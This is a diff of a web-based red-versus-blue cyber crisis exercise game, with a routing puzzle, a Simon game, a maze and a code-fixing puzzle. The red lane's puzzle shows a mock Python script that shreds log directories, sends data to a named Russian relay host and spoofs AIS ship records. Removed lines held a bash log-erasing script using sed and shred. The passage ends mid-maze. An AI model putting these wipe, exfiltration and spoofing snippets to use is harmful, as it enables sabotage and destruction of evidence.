           <div class="feedback" id="blue-s1-fb"></div>
+
+          <!-- Hidden enemy note -->
+          <div class="enemy-note" style="margin-top:1rem">
+            "Маршрут 10.2.1.0/24 → Null0. ACL заблокирован на UDP. Они не смогут восстановить кабельные серверы без изменения маршрута и ACL. Операция 'ОБРЫВ' активна."
+            <br><span style="color:var(--muted);font-size:0.55rem">[TL: "Route 10.2.1.0/24 → Null0. ACL blocked on UDP. They cannot restore cable servers without fixing route and ACL. Operation 'CUTLINE' active."]</span>
+          </div>
         </div>
 
-        <!-- Blue Step 2: Simon game ── -->
+        <!-- Blue Step 2: Simon (6 colors, 7 rounds) -->
         <div class="sub-step" id="blue-s2">
-          <div class="enigma-q" style="margin-bottom:0.75rem">
-            <strong>Task 2:</strong> Execute the network restoration sequence. Memorise and reproduce the initialisation protocol pattern to bring the segment online.
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.75rem">
+            CRYPTO HANDSHAKE — Emergency restoration key required. Repeat the authentication sequence to re-establish the encrypted tunnel to the repair vessel.
           </div>
-          <div style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted);margin-bottom:0.75rem" id="simonStatus">Watch the sequence, then repeat it.</div>
-          <div class="simon-grid">
-            <button class="simon-btn" data-color="blue"   onclick="simonPress('blue')"   disabled>NET INIT</button>
-            <button class="simon-btn" data-color="green"  onclick="simonPress('green')"  disabled>ROUTE UP</button>
-            <button class="simon-btn" data-color="yellow" onclick="simonPress('yellow')" disabled>SYNC BGP</button>
-            <button class="simon-btn" data-color="red"    onclick="simonPress('red')"    disabled>VERIFY</button>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--yellow);margin-bottom:0.5rem">
+            ⚠ 6-channel sequence · <span id="simonRoundDisplay">7 rounds</span> total · Speed increases each round
           </div>
-          <button class="btn btn-primary" id="simonStartBtn" onclick="startSimon()" style="width:100%">▸ START SEQUENCE</button>
+
+          <div class="simon-grid" style="grid-template-columns: repeat(3, 1fr)">
+            <div class="simon-btn" data-color="blue"   onclick="simonPress('blue')">NODE-A</div>
+            <div class="simon-btn" data-color="green"  onclick="simonPress('green')">NODE-B</div>
+            <div class="simon-btn" data-color="yellow" onclick="simonPress('yellow')">NODE-C</div>
+            <div class="simon-btn" data-color="red"    onclick="simonPress('red')">NODE-D</div>
+            <div class="simon-btn" data-color="white"  onclick="simonPress('white')">NODE-E</div>
+            <div class="simon-btn" data-color="cyan"   onclick="simonPress('cyan')">NODE-F</div>
+          </div>
+
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;padding:0.4rem 0.6rem;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);margin-bottom:0.5rem;text-align:center" id="simonStatus">
+            Initialising sequence...
+          </div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--muted);margin-bottom:0.5rem;text-align:center">
+            Progress: <span id="simonProgress">●●●●●●●</span>
+          </div>
           <div class="feedback" id="blue-s2-fb"></div>
         </div>
       </div><!-- /blue lane -->
 
-      <!-- ═══════════ RED TEAM LANE ═══════════ -->
+      <!-- ════════════ RED TEAM LANE ════════════ -->
       <div class="race-lane red" id="redLane">
         <div class="lane-header">
-          <span class="lane-title red">◈ RED TEAM — Threat Neutralisation</span>
+          <span class="lane-title red">◆ RED — Exfiltration & Cover</span>
           <span class="lane-progress" id="redProgress">STEP 1/2</span>
         </div>
 
-        <!-- Red Step 1: Maze ── -->
+        <!-- Red Step 1: Multi-phase maze (Black→Grey→White walls) -->
         <div class="sub-step active" id="red-s1">
-          <div class="enigma-q" style="margin-bottom:0.75rem">
-            <strong>Task 1:</strong> Navigate the network topology maze to reach the compromised server node and deploy the cleanup script. Use arrow keys or WASD.
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.5rem">
+            PERIMETER BREACH — Navigate through the classified facility. Security zones are layered. You may only traverse walls in the order: <strong style="color:#222">BLACK</strong> → <strong style="color:#888">GREY</strong> → <strong style="color:#ddd">WHITE</strong>. Attempting to cross walls out of order triggers the alarm.
           </div>
-          <div class="maze-container">
-            <canvas id="mazeCanvas" width="300" height="300"></canvas>
+
+          <div class="maze-legend">
+            <span><span class="swatch" style="background:#111;border-color:#333"></span>Black zone (phase 1)</span>
+            <span><span class="swatch" style="background:#555;border-color:#888"></span>Grey zone (phase 2)</span>
+            <span><span class="swatch" style="background:#bbb;border-color:#ddd"></span>White zone (phase 3)</span>
+            <span><span class="swatch" style="background:#1a0f0a;border-color:#ff4a4a"></span>WALL (impassable)</span>
           </div>
-          <div style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted);text-align:center" id="mazeStatus">Navigate to the 🔴 target node</div>
-          <div style="margin-top:0.5rem;display:grid;grid-template-columns:repeat(3,40px);gap:4px;justify-content:center">
-            <div></div>
-            <button class="btn btn-danger" onclick="mazeMove('up')"    style="padding:0.3rem;font-size:0.9rem">▲</button>
-            <div></div>
-            <button class="btn btn-danger" onclick="mazeMove('left')"  style="padding:0.3rem;font-size:0.9rem">◀</button>
-            <button class="btn btn-danger" onclick="mazeMove('down')"  style="padding:0.3rem;font-size:0.9rem">▼</button>
-            <button class="btn btn-danger" onclick="mazeMove('right')" style="padding:0.3rem;font-size:0.9rem">▶</button>
+
+          <div class="maze-phase-label" id="mazePhaseLabel">
+            Current phase: <span id="mazePhaseText" style="color:var(--red)">INITIALIZING</span> · 
+            Zones unlocked: <span id="mazeZonesText">none</span>
+          </div>
+
+          <div class="maze-wrap">
+            <canvas id="mazeCanvas" width="390" height="390"></canvas>
+          </div>
+
+          <div class="maze-controls">
+            <button onclick="mazeMove('up')" title="Up (W/↑)">↑</button>
+            <button onclick="mazeMove('left')" title="Left (A/←)">←</button>
+            <button onclick="mazeMove('down')" title="Down (S/↓)">↓</button>
+            <button onclick="mazeMove('right')" title="Right (D/→)">→</button>
+          </div>
+
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.68rem;padding:0.4rem 0.6rem;background:rgba(0,0,0,0.3);border:1px solid rgba(255,74,74,0.1);text-align:center" id="mazeStatus">
+            START → navigate to the server room (RED marker)
+          </div>
+
+          <!-- Hidden enemy note in maze section -->
+          <div class="enemy-note">
+            "Трасса через чёрный сектор, затем серый коридор D-7, затем белый терминал. Не отклоняйся. Сервер на юго-востоке."
+            <br><span style="color:var(--muted);font-size:0.55rem">[TL: "Route through black sector, then grey corridor D-7, then white terminal. Do not deviate. Server is south-east."]</span>
           </div>
         </div>
 
-        <!-- Red Step 2: Code fix ── -->
+        <!-- Red Step 2: Code fix (harder — more errors, obfuscated) -->
         <div class="sub-step" id="red-s2">
-          <div class="enigma-q" style="margin-bottom:0.75rem">
-            <strong>Task 2:</strong> Three lines in the cleanup script contain bugs that will expose the operation. Click each <span style="color:var(--red)">highlighted error</span> and type the correct value.
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.75rem">
+            EXFIL SCRIPT — The extraction script has been partially corrupted. Fix all 5 highlighted errors to execute the data wipe and exfiltration. The script references are provided in the comments.
           </div>
 
-          <div class="code-editor" id="codeEditor">
-            <div class="code-line"><span class="code-ln">01</span><span class="code-txt"><span class="kw">#!/bin/bash</span></span></div>
-            <div class="code-line"><span class="code-ln">02</span><span class="code-txt"><span class="cm"># OPERATION CUTLINE — Trace cleanup</span></span></div>
-            <div class="code-line"><span class="code-ln">03</span><span class="code-txt"></span></div>
-            <div class="code-line"><span class="code-ln">04</span><span class="code-txt"><span class="fn">TARGET_IP</span>=<span class="str">"192.168.48.1"</span></span></div>
-            <div class="code-line"><span class="code-ln">05</span><span class="code-txt"><span class="fn">LOG_DIR</span>=<span class="str" id="ce1" class="err" onclick="editCode(this,'ce1','/var/log/audit')"  style="cursor:pointer;color:var(--red);background:rgba(255,74,74,0.15)">&quot;/var/log/autid&quot;</span>  <span class="cm"># ERROR</span></span></div>
-            <div class="code-line"><span class="code-ln">06</span><span class="code-txt"></span></div>
-            <div class="code-line"><span class="code-ln">07</span><span class="code-txt"><span class="cm"># Wipe AIS transponder log entries</span></span></div>
-            <div class="code-line"><span class="code-ln">08</span><span class="code-txt"><span class="fn">sed</span> -i <span class="str" id="ce2" onclick="editCode(this,'ce2','s/273410820/000000000/g')" style="cursor:pointer;color:var(--red);background:rgba(255,74,74,0.15)">&quot;s/MMSI_TARGET/000000000/g&quot;</span> $LOG_DIR/ais.log  <span class="cm"># ERROR</span></span></div>
+          <div class="code-editor">
+            <div class="code-line"><span class="code-ln">01</span><span class="code-txt"><span class="cm">#!/usr/bin/env python3</span></span></div>
+            <div class="code-line"><span class="code-ln">02</span><span class="code-txt"><span class="cm"># OPERATION CUTLINE — Exfil cleanup v2.4</span></span></div>
+            <div class="code-line"><span class="code-ln">03</span><span class="code-txt"><span class="cm"># Target: SRV-CABLE1, SRV-CABLE2 · Kaliningrad relay</span></span></div>
+            <div class="code-line"><span class="code-ln">04</span><span class="code-txt"><span class="kw">import</span> os, subprocess, hashlib, base64</span></div>
+            <div class="code-line"><span class="code-ln">05</span><span class="code-txt"></span></div>
+            <div class="code-line"><span class="code-ln">06</span><span class="code-txt">RELAY_HOST = <span class="err" id="ce1" onclick="editCode(this,'ce1','relay.kal-grd-01.ru')">\"relay.kal-grd-CORRUPTED.ru\"</span>  <span class="cm"># fix: relay.kal-grd-01.ru</span></span></div>
+            <div class="code-line"><span class="code-ln">07</span><span class="code-txt">RELAY_PORT = <span class="err" id="ce2" onclick="editNum(this,'ce2',4443)">8080</span>  <span class="cm"># fix: use encrypted relay port 4443</span></span></div>
+            <div class="code-line"><span class="code-ln">08</span><span class="code-txt">EXFIL_KEY  = <span class="str">"b64:aGlkZGVuX29wZXJhdGlvbl9rZXk="</span>  <span class="cm"># do not modify</span></span></div>
             <div class="code-line"><span class="code-ln">09</span><span class="code-txt"></span></div>
-            <div class="code-line"><span class="code-ln">10</span><span class="code-txt"><span class="cm"># Zero-fill satellite imagery cache</span></span></div>
-            <div class="code-line"><span class="code-ln">11</span><span class="code-txt"><span class="fn">shred</span> -n <span id="ce3" onclick="editCode(this,'ce3','7')" style="cursor:pointer;color:var(--red);background:rgba(255,74,74,0.15)">0</span> -z /data/sat/C2_0419Z.sar  <span class="cm"># ERROR</span></span></div>
-            <div class="code-line"><span class="code-ln">12</span><span class="code-txt"></span></div>
-            <div class="code-line"><span class="code-ln">13</span><span class="code-txt"><span class="kw">echo</span> <span class="str">"Cleanup complete — traces eliminated"</span></span></div>
+            <div class="code-line"><span class="code-ln">10</span><span class="code-txt"><span class="kw">def</span> <span class="fn">secure_wipe</span>(path, passes):</span></div>
+            <div class="code-line"><span class="code-ln">11</span><span class="code-txt">  <span class="cm">"""DoD 5220.22-M standard: 7 overwrite passes"""</span></span></div>
+            <div class="code-line"><span class="code-ln">12</span><span class="code-txt">  <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(passes):</span></div>
+            <div class="code-line"><span class="code-ln">13</span><span class="code-txt">    subprocess.<span class="fn">run</span>([<span class="str">'shred'</span>, <span class="str">'-n'</span>, <span class="fn">str</span>(passes), <span class="str">'-z'</span>, path])</span></div>
+            <div class="code-line"><span class="code-ln">14</span><span class="code-txt"></span></div>
+            <div class="code-line"><span class="code-ln">15</span><span class="code-txt">WIPE_PASSES = <span class="err" id="ce3" onclick="editNum(this,'ce3',7)">3</span>  <span class="cm"># fix: DoD standard = 7 passes</span></span></div>
+            <div class="code-line"><span class="code-ln">16</span><span class="code-txt">WIPE_TARGETS = [<span class="str">'/srv/cable/logs'</span>, <span class="str">'/srv/cable/ais_mirror'</span>, <span class="str">'/tmp/op_cutline'</span>]</span></div>
+            <div class="code-line"><span class="code-ln">17</span><span class="code-txt"></span></div>
+            <div class="code-line"><span class="code-ln">18</span><span class="code-txt"><span class="kw">def</span> <span class="fn">exfil_bundle</span>(dst_host, dst_port, key):</span></div>
+            <div class="code-line"><span class="code-ln">19</span><span class="code-txt">  bundle = <span class="fn">compress_and_encrypt</span>(WIPE_TARGETS, key)</span></div>
+            <div class="code-line"><span class="code-ln">20</span><span class="code-txt">  <span class="kw">with</span> <span class="fn">socket.create_connection</span>((dst_host, dst_port), timeout=<span class="err" id="ce4" onclick="editNum(this,'ce4',30)">5</span>) <span class="kw">as</span> sock:</span></div>
+            <div class="code-line"><span class="code-ln">21</span><span class="code-txt">    sock.<span class="fn">sendall</span>(bundle)  <span class="cm"># fix timeout: 30s for large payload</span></span></div>
+            <div class="code-line"><span class="code-ln">22</span><span class="code-txt"></span></div>
+            <div class="code-line"><span class="code-ln">23</span><span class="code-txt"><span class="kw">def</span> <span class="fn">spoof_ais_entry</span>(mmsi, lat, lon, timestamp):</span></div>
+            <div class="code-line"><span class="code-ln">24</span><span class="code-txt">  <span class="cm">"""Inject false AIS record to cover ship position"""</span></span></div>
+            <div class="code-line"><span class="code-ln">25</span><span class="code-txt">  fake_record = {<span class="str">'mmsi'</span>: mmsi, <span class="str">'lat'</span>: lat, <span class="str">'lon'</span>: lon,</span></div>
+            <div class="code-line"><span class="code-ln">26</span><span class="code-txt">    <span class="str">'sog'</span>: <span class="err" id="ce5" onclick="editNum(this,'ce5',12.4)">0.0</span>, <span class="str">'hdg'</span>: <span class="err" id="ce5b" onclick="editNum(this,'ce5b',187)">0</span>}  <span class="cm"># fix: inject plausible SOG/heading to avoid detection</span></span></div>
+            <div class="code-line"><span class="code-ln">27</span><span class="code-txt">  <span class="kw">return</span> <span class="fn">ais_inject</span>(fake_record, timestamp)</span></div>
+            <div class="code-line"><span class="code-ln">28</span><span class="code-txt"></span></div>
+            <div class="code-line"><span class="code-ln">29</span><span class="code-txt"><span class="cm"># Main execution</span></span></div>
+            <div class="code-line"><span class="code-ln">30</span><span class="code-txt"><span class="kw">if</span> __name__ == <span class="str">'__main__'</span>:</span></div>
+            <div class="code-line"><span class="code-ln">31</span><span class="code-txt">  [<span class="fn">secure_wipe</span>(t, WIPE_PASSES) <span class="kw">for</span> t <span class="kw">in</span> WIPE_TARGETS]</span></div>
+            <div class="code-line"><span class="code-ln">32</span><span class="code-txt">  <span class="fn">exfil_bundle</span>(RELAY_HOST, RELAY_PORT, EXFIL_KEY)</span></div>
+            <div class="code-line"><span class="code-ln">33</span><span class="code-txt">  <span class="fn">spoof_ais_entry</span>(<span class="str">'273841052'</span>, <span class="str">'57.42'</span>, <span class="str">'19.88'</span>, <span class="str">'2024-01-12T04:30:00Z'</span>)</span></div>
           </div>
 
-          <div style="margin-top:0.5rem;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted)">
-            Errors: (1) Wrong log path — should be audit not autid &nbsp;|&nbsp; (2) MMSI pattern — use the real MMSI &nbsp;|&nbsp; (3) shred passes: 0 is ineffective, use 7
+          <!-- Intercepted note inside code section -->
+          <div class="enemy-note">
+            "Скрипт исправлен. Порт 4443 активен. Стёр следы. Ретранслятор в Калининграде подтвердил получение. ВОВРЕМЯ."
+            <br><span style="color:var(--muted);font-size:0.55rem">[TL: "Script corrected. Port 4443 active. Erased tracks. Kaliningrad relay confirmed reception. ON TIME."]</span>
           </div>
 
-          <button class="btn btn-danger" onclick="checkCode()" style="width:100%;margin-top:0.75rem">RUN SCRIPT</button>
+          <div class="flex gap1 mt2">
+            <button class="btn btn-danger" onclick="checkRedCode()">EXECUTE SCRIPT</button>
+          </div>
           <div class="feedback" id="red-s2-fb"></div>
         </div>
+
       </div><!-- /red lane -->
-
     </div><!-- /race-container -->
-  </div>
-</div>
+  </div><!-- /phase-content -->
+</div><!-- /page-layout -->
 
-<!-- ═══ OUTCOME OVERLAY ═══ -->
+<!-- Outcome overlay -->
 <div class="outcome-overlay" id="outcomeOverlay">
-  <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:0.3em;color:var(--muted);margin-bottom:1rem" id="outcomeBadge">EXERCISE COMPLETE</div>
   <div class="outcome-title" id="outcomeTitle">—</div>
-  <div class="outcome-sub" id="outcomeSub">—</div>
   <div class="outcome-stats">
     <div class="outcome-stat">
-      <div class="val" id="outWinner">—</div>
-      <div class="lbl">Winner</div>
+      <div class="val" id="outcomeTime">—</div>
+      <div class="lbl">Elapsed Time</div>
     </div>
     <div class="outcome-stat">
-      <div class="val" id="outTime">—</div>
-      <div class="lbl">Winning Time</div>
+      <div class="val" id="outcomeWinner">—</div>
+      <div class="lbl">First to finish</div>
     </div>
   </div>
-  <button class="btn btn-success" onclick="window.location.href='../index.html'" style="margin-top:1rem;padding:0.75rem 2rem;font-size:0.9rem">▸ RESTART EXERCISE</button>
+  <div class="outcome-sub" id="outcomeSub"></div>
+  <div style="margin-top:2rem">
+    <button class="btn btn-primary" style="font-size:0.8rem;padding:0.75rem 2rem" onclick="window.location.href='../index.html'">
+      ▸ RETOUR ACCUEIL — DEBRIEF ONU
+    </button>
+  </div>
 </div>
 
 <script src="../js/global.js"></script>
 <script>
-// ── Init ──────────────────────────────────────────────────────
-const team = State.team;
+// ══════════════════════════════════
+// INIT
+// ══════════════════════════════════
 renderTopBar('03', 'FINAL RESPONSE');
 
+const team = localStorage.getItem('crisisTeam') || 'blue';
 const blueLane = document.getElementById('blueLane');
 const redLane  = document.getElementById('redLane');
 
-// Activate only the player's lane
-if (team === 'blue') {
-  blueLane.classList.add('active');
-} else {
-  redLane.classList.add('active');
+if (team === 'blue') { blueLane.classList.add('active'); redLane.classList.remove('active'); }
+else                 { redLane.classList.add('active');  blueLane.classList.remove('active'); }
+
+// Timer
+let startTime = Date.now(), timerInterval;
+function startTimer() {
+  timerInterval = setInterval(() => {
+    const s = Math.floor((Date.now()-startTime)/1000);
+    const m = Math.floor(s/60);
+    document.getElementById('timerDisplay').textContent =
+      String(m).padStart(2,'0') + ':' + String(s%60).padStart(2,'0');
+  }, 500);
 }
+startTimer();
 
-// ── Race Timer ────────────────────────────────────────────────
-let raceStart = Date.now();
-let timerInterval = setInterval(() => {
-  const elapsed = Math.floor((Date.now() - raceStart) / 1000);
-  const m = String(Math.floor(elapsed/60)).padStart(2,'0');
-  const s = String(elapsed%60).padStart(2,'0');
-  document.getElementById('timerDisplay').textContent = `${m}:${s}`;
-}, 1000);
+// ══════════════════════════════════
+// BLUE — Step 1: Routing + Firewall
+// ══════════════════════════════════
+const routeFixes  = { rt1:false, rt2:false, rt3:false, rt4:false };
+const aclFixes    = { acl1:false, acl2:false };
 
-// ── Race sync via BroadcastChannel ────────────────────────────
-const raceChannel = new BroadcastChannel('crisis_race_p3');
-raceChannel.onmessage = (e) => {
-  if (e.data.type === 'finish') {
-    handleOpponentFinished(e.data.team, e.data.elapsed);
-  }
-};
-
-function signalMyFinish() {
-  const elapsed = Math.floor((Date.now() - raceStart) / 1000);
-  raceChannel.postMessage({ type: 'finish', team, elapsed });
-  handleFinish(team, elapsed, true);
-}
-
-function handleOpponentFinished(winnerTeam, elapsed) {
-  if (winnerTeam !== team) {
-    handleFinish(winnerTeam, elapsed, false);
-  }
-}
-
-function handleFinish(winner, elapsed, iMe) {
-  clearInterval(timerInterval);
-  const m = String(Math.floor(elapsed/60)).padStart(2,'0');
-  const s = String(elapsed%60).padStart(2,'0');
-  const timeStr = `${m}:${s}`;
-
-  const overlay = document.getElementById('outcomeOverlay');
-  const title   = document.getElementById('outcomeTitle');
-  const sub     = document.getElementById('outcomeSub');
-  const badge   = document.getElementById('outcomeBadge');
-  const winEl   = document.getElementById('outWinner');
-  const timeEl  = document.getElementById('outTime');
-
-  winEl.textContent = (winner === 'blue' ? 'BLUE TEAM' : 'RED TEAM');
-  timeEl.textContent = timeStr;
-  winEl.style.color = winner === 'blue' ? 'var(--blue)' : 'var(--red)';
-
-  if (winner === 'blue') {
-    title.textContent = 'Network Restored';
-    title.style.color = 'var(--blue)';
-    sub.textContent = 'Blue Team completed the restoration sequence before the threat was neutralised. The cable segment is back online — the operation is exposed. Blue Team wins.';
+function fixRoute(id, correctVal, net) {
+  const el = document.getElementById(id);
+  const val = prompt(`Fix next-hop for ${net}. Enter correct IP:`, el.textContent);
+  if (val === null) return;
+  if (val.trim() === correctVal) {
+    el.textContent = correctVal;
+    el.className = 'rt-fixed';
+    el.onclick = null;
+    routeFixes[id] = true;
   } else {
-    title.textContent = 'Traces Eliminated';
-    title.style.color = 'var(--red)';
-    sub.textContent = 'Red Team completed the cleanup before Blue Team restored the network. All forensic traces were wiped before the restoration window closed. Red Team wins.';
-  }
-
-  overlay.classList.add('show');
-  if (winner === team) launchConfetti(winner);
-}
-
-function launchConfetti(winner) {
-  const color = winner === 'blue' ? '#4a9eff' : '#ff4a4a';
-  for (let i = 0; i < 60; i++) {
-    const d = document.createElement('div');
-    d.className = 'confetti-dot';
-    const size = 4 + Math.random() * 6;
-    d.style.cssText = `width:${size}px;height:${size}px;background:${color};left:${Math.random()*100}vw;top:-10px;animation-duration:${1.5+Math.random()*2}s;animation-delay:${Math.random()*0.8}s;opacity:0.85;`;
-    document.body.appendChild(d);
+    el.style.color = 'var(--red)';
+    setTimeout(() => el.style.color = '', 600);
+    alert('Incorrect — check the network diagram and subnet assignments.');
   }
 }
 
-// ══════════════════════════════════════════
-// BLUE TEAM LOGIC
-// ══════════════════════════════════════════
-const correctIPs = {
-  ip1: '192.168.48.1',  // router eth2
-  ip2: '192.168.48.1',  // gateway
-  ip3: '192.168.48.0/21',
-  ip4: '192.168.48.5'
-};
-
-// Accept slight variations
-function ipMatch(input, correct) {
-  return input.trim().replace(/\s/g,'') === correct;
+function fixACL(id, correctVal, hint) {
+  const el = document.getElementById(id);
+  const val = prompt(`Fix ACL entry (${hint}). Enter correct value:`, el.textContent);
+  if (val === null) return;
+  if (val.trim() === correctVal) {
+    el.textContent = correctVal;
+    el.className = 'fix';
+    el.onclick = null; el.style.cursor = 'default';
+    aclFixes[id] = true;
+  } else {
+    el.style.animation='none'; el.offsetHeight; el.style.animation='';
+    alert('Incorrect — re-read the comment on that line.');
+  }
 }
 
-function checkBlueIPs() {
-  const fields = ['ip1','ip2','ip3','ip4'];
-  let allOk = true;
-  fields.forEach(id => {
-    const el = document.getElementById(id);
-    const val = el.value.trim();
-    if (ipMatch(val, correctIPs[id])) {
-      el.classList.remove('wrong'); el.classList.add('correct'); el.disabled = true;
-    } else {
-      el.classList.remove('correct'); el.classList.add('wrong');
-      allOk = false;
-    }
-  });
+function checkBlueS1() {
   const fb = document.getElementById('blue-s1-fb');
-  if (allOk) {
-    fb.textContent = '✓ All routes verified — switching to activation sequence.';
+  const routesDone = Object.values(routeFixes).filter(Boolean).length;
+  const aclsDone   = Object.values(aclFixes).filter(Boolean).length;
+  if (routesDone === 4 && aclsDone === 2) {
+    fb.textContent = '✓ All routing entries corrected. Firewall ACL repaired. BGP sessions re-establishing... SRV-CABLE1 and SRV-CABLE2 coming online.';
     fb.className = 'feedback show ok';
-    document.getElementById('blueProgress').textContent = 'STEP 2/2';
     setTimeout(() => {
       document.getElementById('blue-s1').classList.remove('active');
       document.getElementById('blue-s2').classList.add('active');
-    }, 900);
+      document.getElementById('blueProgress').textContent = 'STEP 2/2';
+      nextSimonRound();
+    }, 1000);
   } else {
-    fb.textContent = '✗ One or more IP addresses are incorrect — check the subnet reference below the table.';
+    fb.textContent = `✗ Not complete — ${4-routesDone} routing error(s) and ${2-aclsDone} ACL error(s) still present. Click red highlighted values to fix.`;
     fb.className = 'feedback show err';
   }
 }
 
-// ── Simon game ────────────────────────────────────────────────
-const COLORS = ['blue','green','yellow','red'];
-const LABELS = { blue:'NET INIT', green:'ROUTE UP', yellow:'SYNC BGP', red:'VERIFY' };
-let simonSeq = [], simonInput = [], simonRound = 0, simonMaxRounds = 4;
+// ══════════════════════════════════
+// BLUE — Step 2: Simon (6 colors, 7 rounds, accelerating)
+// ══════════════════════════════════
+const COLORS = ['blue','green','yellow','red','white','cyan'];
+let simonSeq = [], simonInput = [], simonRound = 0;
+const simonMaxRounds = 7;
 let simonActive = false;
+const simonDots = Array(simonMaxRounds).fill('●');
 
-function startSimon() {
-  document.getElementById('simonStartBtn').style.display = 'none';
-  simonSeq = [];
-  simonRound = 0;
-  nextSimonRound();
+function updateSimonProgress() {
+  const d = simonDots.map((dot,i) => i < simonRound ? '<span style="color:var(--green)">✓</span>' : dot).join('');
+  document.getElementById('simonProgress').innerHTML = d;
 }
 
 function nextSimonRound() {
   simonRound++;
-  simonSeq.push(COLORS[Math.floor(Math.random()*4)]);
   simonInput = [];
-  simonActive = false;
+  simonSeq.push(COLORS[Math.floor(Math.random()*COLORS.length)]);
+  document.getElementById('simonRoundDisplay').textContent = `Round ${simonRound}/${simonMaxRounds}`;
+  updateSimonProgress();
+  document.getElementById('blue-s2-fb').className = 'feedback';
   document.getElementById('simonStatus').textContent = `Round ${simonRound}/${simonMaxRounds} — Watch the sequence...`;
   disableSimon(true);
-  playSimonSequence(() => {
-    document.getElementById('simonStatus').textContent = `Round ${simonRound}/${simonMaxRounds} — Repeat the sequence!`;
+  const speed = Math.max(250, 550 - simonRound * 45); // gets faster
+  playSimonSequence(speed, () => {
+    document.getElementById('simonStatus').textContent = `Round ${simonRound}/${simonMaxRounds} — Repeat the sequence! (${simonSeq.length} step${simonSeq.length>1?'s':''})`;
     disableSimon(false);
     simonActive = true;
   });
 }
 
-function disableSimon(dis) {
-  document.querySelectorAll('.simon-btn').forEach(b => b.disabled = dis);
-}
+function disableSimon(d) { document.querySelectorAll('.simon-btn').forEach(b => b.disabled = d); }
 
-function playSimonSequence(done) {
+function playSimonSequence(speed, done) {
   let i = 0;
   const step = () => {
     if (i >= simonSeq.length) { setTimeout(done, 400); return; }
     lightSimon(simonSeq[i]);
-    setTimeout(() => { unlightSimon(simonSeq[i]); i++; setTimeout(step, 200); }, 500);
+    setTimeout(() => { unlightSimon(simonSeq[i]); i++; setTimeout(step, speed * 0.4); }, speed);
   };
-  setTimeout(step, 500);
+  setTimeout(step, 600);
 }
 
-function lightSimon(color) {
-  document.querySelector(`.simon-btn[data-color="${color}"]`).classList.add('lit');
-}
-function unlightSimon(color) {
-  document.querySelector(`.simon-btn[data-color="${color}"]`).classList.remove('lit');
-}
+function lightSimon(c) { document.querySelector(`.simon-btn[data-color="${c}"]`).classList.add('lit'); }
+function unlightSimon(c) { document.querySelector(`.simon-btn[data-color="${c}"]`).classList.remove('lit'); }
 
-function simonPress(color) {
+function simonPress(c) {
   if (!simonActive) return;
-  lightSimon(color); setTimeout(() => unlightSimon(color), 200);
-  simonInput.push(color);
+  lightSimon(c); setTimeout(() => unlightSimon(c), 180);
+  simonInput.push(c);
   const idx = simonInput.length - 1;
   if (simonInput[idx] !== simonSeq[idx]) {
     simonActive = false; disableSimon(true);
     const fb = document.getElementById('blue-s2-fb');
-    fb.textContent = '✗ Wrong sequence — restarting.';
+    fb.textContent = '✗ Wrong node — sequence reset. Restarting from round 1.';
     fb.className = 'feedback show err';
-    setTimeout(() => { fb.className='feedback'; simonSeq=[]; simonRound=0; nextSimonRound(); }, 1000);
+    setTimeout(() => { fb.className='feedback'; simonSeq=[]; simonRound=0; nextSimonRound(); }, 1400);
     return;
   }
   if (simonInput.length === simonSeq.length) {
     simonActive = false; disableSimon(true);
     if (simonRound >= simonMaxRounds) {
       const fb = document.getElementById('blue-s2-fb');
-      fb.textContent = '✓ Sequence complete — network restoration protocol executed successfully!';
+      fb.textContent = '✓ All 7 authentication rounds passed. Encrypted tunnel to repair vessel established. Network restoration COMPLETE.';
       fb.className = 'feedback show ok';
-      setTimeout(signalMyFinish, 600);
+      blueLane.classList.add('won');
+      setTimeout(signalFinish, 700);
     } else {
-      setTimeout(nextSimonRound, 500);
+      document.getElementById('simonStatus').textContent = `Round ${simonRound}/${simonMaxRounds} — Correct!`;
+      setTimeout(nextSimonRound, 700);
     }
   }
 }
 
-// ══════════════════════════════════════════
-// RED TEAM LOGIC
-// ══════════════════════════════════════════
+// ══════════════════════════════════
+// RED — Maze (Black→Grey→White)
+// ══════════════════════════════════
+// Phase 1 (black walls), 2 (grey walls), 3 (white walls)
+// Larger grid: 13x13 cells
+const CELL = 30, COLS = 13, ROWS = 13;
+const CANVAS_W = COLS * CELL, CANVAS_H = ROWS * CELL;
+const mazeCanvas = document.getElementById('mazeCanvas');
+mazeCanvas.width  = CANVAS_W;
+mazeCanvas.height = CANVAS_H;
 
-// ── Maze ──────────────────────────────────
-const CELL = 30, COLS = 10, ROWS = 10;
-let playerPos = {x:0, y:0};
-const goal = {x:9, y:9};
+let playerPos = {x:0, y:12};      // START: bottom-left
+const goal     = {x:12, y:0};      // GOAL: top-right
+let mazePhase  = 1;                 // 1=black walls only, 2=+grey, 3=+white
+let phasesCompleted = 0;
 
-// Maze layout: 1 = wall, 0 = open
-const mazeGrid = [
-  [0,1,0,0,0,1,0,0,0,0],
-  [0,1,0,1,0,1,0,1,1,0],
-  [0,0,0,1,0,0,0,0,1,0],
-  [1,1,0,1,1,1,1,0,1,0],
-  [0,0,0,0,0,0,1,0,0,0],
-  [0,1,1,1,1,0,1,1,1,0],
-  [0,0,0,1,0,0,0,0,1,0],
-  [1,1,0,1,0,1,1,0,1,0],
-  [0,0,0,0,0,1,0,0,0,1],
-  [0,1,1,1,0,0,0,1,0,0]
+// Phase intermediate goals
+const phaseGoals = [
+  {x:6, y:6},   // Phase 1 checkpoint (center)
+  {x:12, y:6},  // Phase 2 checkpoint (right middle)
+  {x:12, y:0},  // Final goal
 ];
 
+// Wall colors per cell: 0=open, 1=black wall, 2=grey wall, 3=white wall
+// This 13x13 maze is much harder — longer path required
+const mazeGrid = [
+//  0  1  2  3  4  5  6  7  8  9 10 11 12
